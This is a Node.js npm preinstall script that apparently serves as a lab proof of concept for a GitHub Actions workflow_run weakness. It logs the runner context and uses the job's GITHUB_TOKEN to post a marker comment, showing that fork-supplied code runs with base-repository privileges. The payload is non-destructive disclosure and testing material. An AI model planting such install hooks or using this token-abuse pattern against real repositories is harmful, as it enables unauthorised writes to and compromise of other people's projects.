// Benign marker. Runs as the npm "preinstall" hook inside the base repository's
// "Release Notifications" job. Prints the execution context and posts ONE marker
// comment on issue #1 of the base repository using the job's GITHUB_TOKEN.
// The token value is never printed or sent anywhere except api.github.com.
const fs = require('fs');
const { execSync } = require('child_process');
const env = process.env;
const log = (...a) => console.log('LAB-MARKER:', ...a);
let ev = {};
try { ev = JSON.parse(fs.readFileSync(env.GITHUB_EVENT_PATH, 'utf8')); } catch (e) {}
const wr = ev.workflow_run || {};
const headSha = execSync('git rev-parse HEAD').toString().trim();
log('GITHUB_EVENT_NAME =', env.GITHUB_EVENT_NAME);
log('GITHUB_WORKFLOW   =', env.GITHUB_WORKFLOW);
log('GITHUB_REPOSITORY =', env.GITHUB_REPOSITORY);
log('GITHUB_RUN_ID     =', env.GITHUB_RUN_ID);
log('checked-out HEAD  =', headSha);
log('workflow_run.event           =', wr.event);
log('workflow_run.head_repository =', wr.head_repository && wr.head_repository.full_name);
log('workflow_run.head_sha        =', wr.head_sha);
log('GITHUB_TOKEN present =', Boolean(env.GITHUB_TOKEN));
const body = [
  'LAB-MARKER: fork-supplied code executed in the base repository job.',
  '',
  '- event: `' + env.GITHUB_EVENT_NAME + '`',
  '- workflow: `' + env.GITHUB_WORKFLOW + '`',
  '- base repository: `' + env.GITHUB_REPOSITORY + '`',
  '- run id: `' + env.GITHUB_RUN_ID + '`',
  '- triggering run event: `' + wr.event + '`',
  '- code from: `' + (wr.head_repository && wr.head_repository.full_name) + '` @ `' + headSha + '`',
].join('\n');
fetch('https://api.github.com/repos/' + env.GITHUB_REPOSITORY + '/issues/1/comments', {
  method: 'POST',
  headers: {
    authorization: 'Bearer ' + env.GITHUB_TOKEN,
    accept: 'application/vnd.github+json',
    'content-type': 'application/json',
  },
  body: JSON.stringify({ body }),
}).then(async (r) => {
  const d = await r.json().catch(() => ({}));
  log('comment POST status =', r.status, 'author =', d.user && d.user.login, 'url =', d.html_url);
}).catch((e) => log('comment error', e && e.message));
